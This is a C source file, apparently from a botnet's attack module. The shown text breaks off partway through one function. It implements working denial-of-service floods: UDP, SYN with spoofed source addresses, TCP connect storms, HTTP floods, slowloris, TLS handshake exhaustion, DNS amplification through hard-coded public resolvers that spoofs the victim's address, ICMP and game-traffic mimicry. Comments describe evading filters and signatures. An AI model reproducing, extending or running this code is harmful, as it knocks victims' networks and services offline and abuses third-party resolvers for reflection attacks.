#include "bot.h"

/* Resolve hostname or IP to in_addr (DNS lookup if needed) */
static int resolve_target(const char *host, struct in_addr *out)
{
    memset(out, 0, sizeof(*out));
    /* Try numeric IP first (fast path) */
    if (inet_pton(AF_INET, host, out) == 1) return 0;
    /* Fallback: DNS resolution */
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    if (getaddrinfo(host, NULL, &hints, &res) != 0 || !res) return -1;
    struct sockaddr_in *sa = (struct sockaddr_in *)res->ai_addr;
    *out = sa->sin_addr;
    freeaddrinfo(res);
    return 0;
}

/* ── MEGA Engine ──────────────────────────────────────
 * Strategy: FEW sockets, MAX PPS/bytes per syscall.
 * - sendmmsg batch of full MTU payloads (1400B) → high Mbps
 * - CPU affinity + busy loop (no sleep in hot path)
 * - Parallel: UDP flood + TCP connect storm + optional SYN
 * - Adaptive sockets from free RAM (not fixed 65k)
 */
typedef struct {
    int *socks;
    int sock_count;
    struct sockaddr_in target;
    int port;
    int duration;
    int cpu_id;
    int mode; /* 0=UDP mega, 1=TCP storm, 2=SYN raw */
    char host[256];
} MegaThread;

static void *mega_worker(void *arg)
{
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs();
    if (ncpu < 1) ncpu = 1;
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self() ^ (unsigned)mt->cpu_id;

    /* ── Mode 1: TCP connect storm (connection exhaustion) ── */
    if (mt->mode == 1) {
        while (time(NULL) - start < mt->duration && !g_attack_stop) {
            for (int b = 0; b < 128 && !g_attack_stop; b++) {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s < 0) continue;
                int fl = 1;
                setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
                fcntl(s, F_SETFL, O_NONBLOCK);
                connect(s, (struct sockaddr *)&mt->target, sizeof(mt->target));
                /* Fire-and-forget: don't wait for handshake */
                close(s);
                pkt_sent(64);
            }
        }
        return NULL;
    }

    /* ── Mode 2: SYN raw (needs CAP_NET_RAW) ── */
    if (mt->mode == 2) {
        int s = create_raw_socket(IPPROTO_TCP);
        if (s < 0) return NULL;
        struct { struct iphdr ip; struct tcphdr tcp; } pkt;
        memset(&pkt, 0, sizeof(pkt));
        pkt.ip.version = 4; pkt.ip.ihl = 5;
        pkt.ip.tot_len = htons(sizeof(pkt));
        pkt.ip.protocol = IPPROTO_TCP;
        pkt.ip.daddr = mt->target.sin_addr.s_addr;
        pkt.ip.ttl = 64;
        pkt.tcp.dest = htons((uint16_t)mt->port);
        pkt.tcp.doff = 5; pkt.tcp.syn = 1;
        pkt.tcp.window = htons(65535);
        struct sockaddr_in sin = mt->target;
        while (time(NULL) - start < mt->duration && !g_attack_stop) {
            for (int b = 0; b < 256; b++) {
                pkt.ip.id = htons((uint16_t)rand_r(&seed));
                pkt.ip.saddr = rand_vn_ip();
                pkt.tcp.source = htons((uint16_t)(1024 + rand_r(&seed) % 64511));
                pkt.tcp.seq = htonl(rand_r(&seed));
                pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
                pkt.tcp.check = 0; pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
                if (sendto(s, &pkt, sizeof(pkt), MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) > 0)
                    pkt_sent((int)sizeof(pkt));
            }
        }
        close(s);
        return NULL;
    }

    /* ── Mode 0: UDP mega (default) — full MTU + sendmmsg ── */
    int batch = MEGA_BATCH;
    size_t msg_sz = sizeof(struct mmsghdr) * (size_t)batch;
    size_t iov_sz = sizeof(struct iovec) * (size_t)batch;
    size_t ring_sz = (size_t)batch * MEGA_PAYLOAD;

    struct mmsghdr *msgs = mmap(NULL, msg_sz, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    struct iovec *iovs = mmap(NULL, iov_sz, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *ring = mmap(NULL, ring_sz, PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (msgs == MAP_FAILED || iovs == MAP_FAILED || ring == MAP_FAILED) {
        if (msgs != MAP_FAILED) munmap(msgs, msg_sz);
        if (iovs != MAP_FAILED) munmap(iovs, iov_sz);
        if (ring != MAP_FAILED) munmap(ring, ring_sz);
        return NULL;
    }

    /* Fill ring with randomized full-size payloads (high bandwidth) */
    for (int i = 0; i < batch; i++) {
        unsigned char *slot = ring + (size_t)i * MEGA_PAYLOAD;
        for (int j = 0; j < MEGA_PAYLOAD; j += 4) {
            unsigned r = rand_r(&seed);
            slot[j] = r & 0xFF;
            if (j + 1 < MEGA_PAYLOAD) slot[j + 1] = (r >> 8) & 0xFF;
            if (j + 2 < MEGA_PAYLOAD) slot[j + 2] = (r >> 16) & 0xFF;
            if (j + 3 < MEGA_PAYLOAD) slot[j + 3] = (r >> 24) & 0xFF;
        }
        /* Mix in real patterns every few slots */
        if (g_total_payloads > 0 && (i % 8) == 0) {
            int idx = rand_r(&seed) % g_total_payloads;
            int pl = g_payload_lens[idx];
            if (pl > MEGA_PAYLOAD) pl = MEGA_PAYLOAD;
            memcpy(slot, g_payloads[idx], (size_t)pl);
        }
        iovs[i].iov_base = slot;
        iovs[i].iov_len = MEGA_PAYLOAD;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &mt->target;
        msgs[i].msg_hdr.msg_namelen = sizeof(mt->target);
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
        msgs[i].msg_len = 0;
    }

    int flags = MSG_DONTWAIT | MSG_NOSIGNAL;
#ifdef MSG_ZEROCOPY
    flags |= MSG_ZEROCOPY;
#endif

    while (time(NULL) - start < mt->duration && !g_attack_stop) {
        if (should_pause()) { usleep(200); continue; }
        for (int si = 0; si < mt->sock_count && !g_attack_stop; si++) {
            /* Rotate payload bytes slightly each burst (anti-filter) */
            if ((seed & 0x3F) == 0) {
                int slot = rand_r(&seed) % batch;
                unsigned char *p = ring + (size_t)slot * MEGA_PAYLOAD;
                p[rand_r(&seed) % MEGA_PAYLOAD] ^= (unsigned char)rand_r(&seed);
            }
            for (int b = 0; b < BURST_MULTIPLIER; b++) {
                int r = sendmmsg(mt->socks[si], msgs, batch, flags);
                if (r > 0) {
                    pkt_sent(r * MEGA_PAYLOAD);
                } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    /* TX queue full — brief yield then continue */
                    usleep(1);
                    break;
                }
            }
        }
        seed++;
    }

    munmap(msgs, msg_sz);
    munmap(iovs, iov_sz);
    munmap(ring, ring_sz);
    return NULL;
}

/* ── Token Bucket (lock only when contended) ───── */
static void tb_init(TokenBucket *tb, double r, double b)
{
    if (r < 1) r = 1;
    if (b < r) b = r;
    tb->rate = r; tb->burst = b; tb->tokens = b;
    clock_gettime(CLOCK_MONOTONIC, &tb->last);
    pthread_mutex_init(&tb->mtx, NULL);
}

/* Consume n tokens; for high PPS pass n=burst size once per loop */
static int tb_consume(TokenBucket *tb, int n)
{
    if (n <= 0) return 1;
    /* Unlimited path: rate >= 5M → always allow (admin/MEGA-like) */
    if (tb->rate >= 5000000.0) return 1;

    pthread_mutex_lock(&tb->mtx);
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    double elapsed = (now.tv_sec - tb->last.tv_sec) + (now.tv_nsec - tb->last.tv_nsec) / 1e9;
    tb->tokens += elapsed * tb->rate;
    if (tb->tokens > tb->burst) tb->tokens = tb->burst;
    tb->last = now;
    int ok = (tb->tokens >= n);
    if (ok) tb->tokens -= n;
    pthread_mutex_unlock(&tb->mtx);
    return ok;
}

static uint16_t icmp_csum(void *d, size_t l)
{
    return ip_csum(d, l);
}

typedef struct {
    AttackParams *ap;
    TokenBucket *tb;
    struct sockaddr_in ta;
    int cpu;
} WorkerArg;

static void *attack_worker(void *arg)
{
    WorkerArg *x = (WorkerArg *)arg;
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(x->cpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    if (!strcmp(x->ap->method, "UDP")) udp_flood(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "SYN")) syn_flood(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "TCP")) tcp_flood(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "HTTP")) http_flood(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "MIX")) mixed(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "ICMP")) icmp_flood(x->ta, x->ap, x->tb);
    else if (x->ap->slowloris || !strcmp(x->ap->method, "SLOWLORIS")) slowloris(x->ta, x->ap, x->tb);
    else if (x->ap->tls_exhaust || !strcmp(x->ap->method, "TLS_EXHAUST")) tls_exhaust(x->ta, x->ap, x->tb);
    else if (x->ap->dns_amp || !strcmp(x->ap->method, "DNS_AMP")) dns_amp(x->ta, x->ap, x->tb);
    else if (x->ap->game_mimic || !strcmp(x->ap->method, "GAME_MIMIC")) game_mimic(x->ta, x->ap, x->tb);
    else udp_flood(x->ta, x->ap, x->tb);

    free(x->ap);
    free(x->tb);
    free(x);
    return NULL;
}

/* ── Flood Workers (v4.0.9 — multi-sock, batch, high Mbps) ── */

#define FLOOD_SOCKS 8
#define UDP_BATCH 32

void udp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int socks[FLOOD_SOCKS];
    int nsk = 0;
    for (int i = 0; i < FLOOD_SOCKS; i++) {
        int s = create_udp_socket();
        if (s >= 0) socks[nsk++] = s;
    }
    if (nsk < 1) return;

    const int batch = UDP_BATCH;
    unsigned char *ring = aligned_alloc(64, (size_t)batch * MAX_PAYLOAD);
    struct mmsghdr *msgs = calloc((size_t)batch, sizeof(struct mmsghdr));
    struct iovec *iovs = calloc((size_t)batch, sizeof(struct iovec));
    if (!ring || !msgs || !iovs) {
        free(ring); free(msgs); free(iovs);
        for (int i = 0; i < nsk; i++) close(socks[i]);
        return;
    }

    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    for (int i = 0; i < batch; i++) {
        unsigned char *slot = ring + (size_t)i * MAX_PAYLOAD;
        int len = 512 + (int)(rand_r(&seed) % (MAX_PAYLOAD - 512));
        if (g_total_payloads > 0 && (i % 2) == 0) {
            int idx = rand_r(&seed) % g_total_payloads;
            len = g_payload_lens[idx];
            if (len > MAX_PAYLOAD) len = MAX_PAYLOAD;
            memcpy(slot, g_payloads[idx], (size_t)len);
        } else {
            for (int j = 0; j < len; j++) slot[j] = (unsigned char)rand_r(&seed);
        }
        iovs[i].iov_base = slot;
        iovs[i].iov_len = (size_t)len;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &ta;
        msgs[i].msg_hdr.msg_namelen = sizeof(ta);
    }

    int flags = MSG_DONTWAIT | MSG_NOSIGNAL;
    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, batch)) { usleep(20); continue; }
        if (should_pause()) { usleep(200); continue; }
        for (int si = 0; si < nsk && !g_attack_stop; si++) {
            int r = sendmmsg(socks[si], msgs, batch, flags);
            if (r > 0) {
                int bytes = 0;
                for (int k = 0; k < r; k++) bytes += (int)iovs[k].iov_len;
                pkt_sent(bytes);
            }
        }
        /* Mutate one slot per loop — anti signature */
        int slot = (int)(rand_r(&seed) % batch);
        ((unsigned char *)iovs[slot].iov_base)[rand_r(&seed) % iovs[slot].iov_len] ^= 0xA5;
    }
    free(ring); free(msgs); free(iovs);
    for (int i = 0; i < nsk; i++) close(socks[i]);
}

void syn_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int s = create_raw_socket(IPPROTO_TCP);
    if (s < 0) return;
    struct { struct iphdr ip; struct tcphdr tcp; } pkt;
    memset(&pkt, 0, sizeof(pkt));
    pkt.ip.version = 4; pkt.ip.ihl = 5;
    pkt.ip.tot_len = htons(sizeof(pkt));
    pkt.ip.protocol = IPPROTO_TCP;
    pkt.ip.daddr = ta.sin_addr.s_addr;
    pkt.tcp.dest = htons((uint16_t)p->port);
    pkt.tcp.doff = 5;
    pkt.tcp.window = htons(65535);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    struct sockaddr_in sin = ta;
    sin.sin_port = htons((uint16_t)p->port);

    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, BURST_SIZE)) { usleep(20); continue; }
        if (should_pause()) { usleep(200); continue; }
        for (int b = 0; b < BURST_SIZE && !g_attack_stop; b++) {
            pkt.ip.id = htons((uint16_t)rand_r(&seed));
            pkt.ip.saddr = (p->spoof_mode == 1) ? rand_vn_ip()
                         : (p->spoof_mode == 2) ? rand_r(&seed) : rand_vn_ip();
            pkt.ip.ttl = 48 + (rand_r(&seed) % 80);
            pkt.ip.frag_off = (p->fragmentation && (rand_r(&seed) % 5) == 0)
                              ? htons(0x2000 | (rand_r(&seed) % 64)) : 0;
            /* Mix SYN / SYN+ACK / RST for filter bypass */
            pkt.tcp.syn = 1; pkt.tcp.ack = 0; pkt.tcp.rst = 0;
            int fl = rand_r(&seed) % 10;
            if (fl == 0) { pkt.tcp.ack = 1; }
            else if (fl == 1) { pkt.tcp.rst = 1; pkt.tcp.syn = 0; }
            pkt.tcp.source = htons((uint16_t)(1024 + (rand_r(&seed) % 64511)));
            pkt.tcp.seq = htonl(rand_r(&seed));
            pkt.tcp.ack_seq = pkt.tcp.ack ? htonl(rand_r(&seed)) : 0;
            pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
            pkt.tcp.check = 0; pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
            if (sendto(s, &pkt, sizeof(pkt), MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) > 0)
                pkt_sent((int)sizeof(pkt));
        }
    }
    close(s);
}

void tcp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    /* Pool of half-open + data-blast sockets */
    const int pool = 64;
    int socks[64];
    int n = 0;
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    char junk[1024];
    for (int i = 0; i < 1024; i++) junk[i] = (char)(rand_r(&seed) & 0xFF);

    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, 32)) { usleep(50); continue; }
        if (should_pause()) { usleep(200); continue; }

        /* Open new non-block connects */
        for (int b = 0; b < 32 && n < pool && !g_attack_stop; b++) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            int f = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &f, sizeof(f));
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr *)&ta, sizeof(ta));
            socks[n++] = s;
            pkt_sent(64);
        }
        /* Blast data on existing, recycle dead */
        for (int i = 0; i < n; i++) {
            ssize_t w = send(socks[i], junk, sizeof(junk), MSG_DONTWAIT | MSG_NOSIGNAL);
            if (w > 0) pkt_sent((int)w);
            else if (w < 0 && errno != EAGAIN && errno != EWOULDBLOCK && errno != EINPROGRESS) {
                close(socks[i]);
                socks[i] = socks[--n];
                i--;
            }
        }
        /* Cap pool — close oldest */
        while (n > pool / 2) {
            close(socks[--n]);
        }
    }
    for (int i = 0; i < n; i++) close(socks[i]);
}

void http_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    const int pool = 32;
    int socks[32];
    int alive[32];
    int n = 0;
    memset(alive, 0, sizeof(alive));
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();

    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, 16)) { usleep(50); continue; }
        if (should_pause()) { usleep(200); continue; }

        /* Open new */
        for (int b = 0; b < 8 && n < pool && !g_attack_stop; b++) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            int f = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &f, sizeof(f));
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr *)&ta, sizeof(ta));
            socks[n] = s; alive[n] = 1; n++;
        }
        /* Pipeline multiple requests per socket */
        for (int i = 0; i < n && !g_attack_stop; i++) {
            if (!alive[i]) continue;
            for (int r = 0; r < 4; r++) {
                unsigned char buf[2048];
                int len = 0;
                gen_http(buf, &len, p->target);
                ssize_t w = send(socks[i], buf, (size_t)len, MSG_DONTWAIT | MSG_NOSIGNAL);
                if (w > 0) pkt_sent((int)w);
                else if (w < 0 && errno != EAGAIN && errno != EWOULDBLOCK && errno != EINPROGRESS) {
                    close(socks[i]); alive[i] = 0;
                    break;
                }
            }
        }
        /* Compact dead */
        int w = 0;
        for (int i = 0; i < n; i++) {
            if (alive[i]) { socks[w] = socks[i]; alive[w] = 1; w++; }
        }
        n = w;
        /* Random recycle to avoid idle timeout on target */
        if (n > 0 && (rand_r(&seed) % 20) == 0) {
            close(socks[n - 1]); n--;
        }
    }
    for (int i = 0; i < n; i++) close(socks[i]);
}

void slowloris(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    const int maxc = 800;
    int *socks = calloc((size_t)maxc, sizeof(int));
    if (!socks) return;
    int cnt = 0;
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    time_t last_drip = time(NULL);

    /* Warm pool fast */
    for (int i = 0; i < maxc && p->duration_secs && !g_attack_stop; i++) {
        if (!tb_consume(tb, 1)) { usleep(1000); continue; }
        int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s < 0) continue;
        int ka = 1;
        setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &ka, sizeof(ka));
        fcntl(s, F_SETFL, O_NONBLOCK);
        connect(s, (struct sockaddr *)&ta, sizeof(ta));
        char ph[640];
        snprintf(ph, sizeof(ph),
                 "GET /?%u HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n"
                 "Accept: */*\r\nAccept-Language: en-US,en;q=0.9\r\n"
                 "Connection: keep-alive\r\n",
                 rand_r(&seed), p->target);
        send(s, ph, strlen(ph), MSG_DONTWAIT | MSG_NOSIGNAL);
        socks[cnt++] = s;
        if ((i & 0x1F) == 0) usleep(1000);
    }

    while (p->duration_secs && !g_attack_stop) {
        time_t now = time(NULL);
        /* Drip headers every 5–15s (classic slowloris) */
        if (now - last_drip >= 5) {
            last_drip = now;
            for (int i = 0; i < cnt && !g_attack_stop; i++) {
                char h[128];
                snprintf(h, sizeof(h), "X-a%u: %u\r\n", rand_r(&seed) % 99999, rand_r(&seed));
                ssize_t w = send(socks[i], h, strlen(h), MSG_DONTWAIT | MSG_NOSIGNAL);
                if (w > 0) pkt_sent((int)w);
                else if (w < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    close(socks[i]);
                    socks[i] = socks[--cnt];
                    i--;
                }
            }
        }
        /* Replenish */
        while (cnt < maxc && p->duration_secs && !g_attack_stop) {
            if (!tb_consume(tb, 1)) break;
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr *)&ta, sizeof(ta));
            char ph[512];
            snprintf(ph, sizeof(ph), "POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 1000000\r\n", p->target);
            send(s, ph, strlen(ph), MSG_DONTWAIT | MSG_NOSIGNAL);
            socks[cnt++] = s;
        }
        usleep(200000);
    }
    for (int i = 0; i < cnt; i++) close(socks[i]);
    free(socks);
}

void tls_exhaust(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    /* Hold many sockets mid-handshake to exhaust TLS workers */
    const int pool = 128;
    int socks[128];
    int n = 0;

    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, 16)) { usleep(50); continue; }
        if (should_pause()) { usleep(200); continue; }

        for (int b = 0; b < 16 && n < pool && !g_attack_stop; b++) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr *)&ta, sizeof(ta));
            unsigned char buf[1024];
            int len = 0;
            gen_tls_hello(buf, &len, p->target);
            send(s, buf, (size_t)len, MSG_DONTWAIT | MSG_NOSIGNAL);
            socks[n++] = s;
            pkt_sent(len);
        }
        /* Occasionally drop half to free FD and reopen */
        if (n >= pool) {
            for (int i = 0; i < n / 2; i++) close(socks[i]);
            memmove(socks, socks + n / 2, (size_t)(n - n / 2) * sizeof(int));
            n -= n / 2;
        }
    }
    for (int i = 0; i < n; i++) close(socks[i]);
}

void dns_amp(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    /* Open resolvers (VN + global) — spoof source = victim */
    static const char *dns_svrs[] = {
        "203.162.4.1", "203.113.131.1", "210.245.0.11", "210.245.0.12",
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
        "9.9.9.9", "208.67.222.222", "64.6.64.6", "94.140.14.14",
        "185.228.168.9", "76.76.2.0", "4.2.2.1", "4.2.2.2",
    };
    const int nsrv = (int)(sizeof(dns_svrs) / sizeof(dns_svrs[0]));
    int s = create_raw_socket(IPPROTO_UDP);
    if (s < 0) {
        /* Fallback: plain UDP without spoof (less amp but still hits resolvers) */
        s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (s < 0) return;
        int bs = 4 * 1024 * 1024;
        setsockopt(s, SOL_SOCKET, SO_SNDBUF, &bs, sizeof(bs));
        unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
        while (p->duration_secs && !g_attack_stop) {
            if (!tb_consume(tb, 64)) { usleep(20); continue; }
            for (int b = 0; b < 64 && !g_attack_stop; b++) {
                struct sockaddr_in sin = {0};
                sin.sin_family = AF_INET;
                sin.sin_port = htons(53);
                inet_pton(AF_INET, dns_svrs[rand_r(&seed) % nsrv], &sin.sin_addr);
                if (sendto(s, DNS_ANY_PAYLOAD, DNS_ANY_LEN, MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) > 0)
                    pkt_sent((int)DNS_ANY_LEN);
            }
        }
        close(s);
        return;
    }

    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, 128)) { usleep(20); continue; }
        if (should_pause()) { usleep(200); continue; }
        for (int b = 0; b < 128 && !g_attack_stop; b++) {
            const char *dip = dns_svrs[rand_r(&seed) % nsrv];
            struct { struct iphdr ip; struct udphdr udp; unsigned char d[64]; } pkt;
            memset(&pkt, 0, sizeof(pkt));
            size_t tl = sizeof(struct iphdr) + sizeof(struct udphdr) + DNS_ANY_LEN;
            pkt.ip.version = 4; pkt.ip.ihl = 5;
            pkt.ip.tot_len = htons((uint16_t)tl);
            pkt.ip.id = htons((uint16_t)rand_r(&seed));
            pkt.ip.ttl = 64; pkt.ip.protocol = IPPROTO_UDP;
            pkt.ip.saddr = ta.sin_addr.s_addr; /* spoof = victim */
            inet_pton(AF_INET, dip, &pkt.ip.daddr);
            pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
            pkt.udp.source = htons((uint16_t)(1024 + rand_r(&seed) % 60000));
            pkt.udp.dest = htons(53);
            pkt.udp.len = htons((uint16_t)(sizeof(struct udphdr) + DNS_ANY_LEN));
            pkt.udp.check = 0;
            memcpy(pkt.d, DNS_ANY_PAYLOAD, DNS_ANY_LEN);
            /* Randomize DNS TXID */
            pkt.d[0] = (unsigned char)(rand_r(&seed) & 0xFF);
            pkt.d[1] = (unsigned char)(rand_r(&seed) & 0xFF);
            struct sockaddr_in sin = {0};
            sin.sin_family = AF_INET;
            sin.sin_port = htons(53);
            sin.sin_addr.s_addr = pkt.ip.daddr;
            if (sendto(s, &pkt, tl, MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) > 0)
                pkt_sent((int)tl);
        }
    }
    close(s);
}

void game_mimic(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int socks[FLOOD_SOCKS];
    int nsk = 0;
    for (int i = 0; i < FLOOD_SOCKS; i++) {
        int s = create_udp_socket();
        if (s >= 0) socks[nsk++] = s;
    }
    if (nsk < 1) return;

    unsigned char buf[512];
    int len = 0;
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, 64)) { usleep(20); continue; }
        if (should_pause()) { usleep(200); continue; }
        for (int b = 0; b < 64 && !g_attack_stop; b++) {
            gen_game_pkt(buf, &len);
            /* Pad to larger size for bandwidth */
            int pad = 64 + (int)(rand_r(&seed) % 200);
            if (len + pad > (int)sizeof(buf)) pad = (int)sizeof(buf) - len;
            for (int j = 0; j < pad; j++) buf[len + j] = (unsigned char)rand_r(&seed);
            len += pad;
            int s = socks[rand_r(&seed) % nsk];
            if (sendto(s, buf, (size_t)len, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
                pkt_sent(len);
        }
    }
    for (int i = 0; i < nsk; i++) close(socks[i]);
}

void icmp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int s = create_raw_socket(IPPROTO_ICMP);
    if (s < 0) return;
    unsigned char icmp[1200];
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    uint16_t seq = 0;

    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, 128)) { usleep(20); continue; }
        if (should_pause()) { usleep(200); continue; }
        for (int b = 0; b < 128 && !g_attack_stop; b++) {
            int plen = 64 + (int)(rand_r(&seed) % 1100);
            memset(icmp, 0, (size_t)plen);
            icmp[0] = 8; /* echo request */
            icmp[1] = 0;
            icmp[4] = (unsigned char)((seq >> 8) & 0xFF);
            icmp[5] = (unsigned char)(seq & 0xFF);
            seq++;
            for (int j = 8; j < plen; j++) icmp[j] = (unsigned char)rand_r(&seed);
            icmp[2] = icmp[3] = 0;
            uint16_t c = icmp_csum(icmp, (size_t)plen);
            icmp[2] = (unsigned char)(c & 0xFF);
            icmp[3] = (unsigned char)((c >> 8) & 0xFF);
            if (sendto(s, icmp, (size_t)plen, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
                pkt_sent(plen);
        }
    }
    close(s);
}

void mixed(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int us = create_udp_socket();
    int rs = create_raw_socket(IPPROTO_TCP);
    if (us < 0) {
        if (rs >= 0) close(rs);
        return;
    }
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    unsigned char big[MAX_PAYLOAD];

    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, 64)) { usleep(20); continue; }
        if (should_pause()) { usleep(200); continue; }
        for (int b = 0; b < 64 && !g_attack_stop; b++) {
            int c = rand_r(&seed) % 8;
            if (c <= 2) {
                /* Heavy UDP — majority of mix */
                int len = 800 + (int)(rand_r(&seed) % 600);
                if (g_total_payloads > 0) {
                    int idx = rand_r(&seed) % g_total_payloads;
                    int pl = g_payload_lens[idx];
                    if (pl > MAX_PAYLOAD) pl = MAX_PAYLOAD;
                    memcpy(big, g_payloads[idx], (size_t)pl);
                    for (int j = pl; j < len; j++) big[j] = (unsigned char)rand_r(&seed);
                } else {
                    for (int j = 0; j < len; j++) big[j] = (unsigned char)rand_r(&seed);
                }
                if (sendto(us, big, (size_t)len, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
                    pkt_sent(len);
            } else if (c == 3 && rs >= 0) {
                struct { struct iphdr ip; struct tcphdr tcp; } pkt;
                memset(&pkt, 0, sizeof(pkt));
                pkt.ip.version = 4; pkt.ip.ihl = 5;
                pkt.ip.tot_len = htons(sizeof(pkt));
                pkt.ip.id = htons((uint16_t)rand_r(&seed));
                pkt.ip.ttl = 50 + (rand_r(&seed) % 74);
                pkt.ip.protocol = IPPROTO_TCP;
                pkt.ip.saddr = (p->spoof_mode >= 1) ? rand_vn_ip() : rand_r(&seed);
                pkt.ip.daddr = ta.sin_addr.s_addr;
                pkt.tcp.source = htons((uint16_t)(1024 + (rand_r(&seed) % 64511)));
                pkt.tcp.dest = htons((uint16_t)p->port);
                pkt.tcp.seq = htonl(rand_r(&seed));
                pkt.tcp.doff = 5; pkt.tcp.syn = 1;
                pkt.tcp.window = htons(65535);
                pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
                pkt.tcp.check = 0; pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
                if (sendto(rs, &pkt, sizeof(pkt), MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
                    pkt_sent((int)sizeof(pkt));
            } else if (c == 4) {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
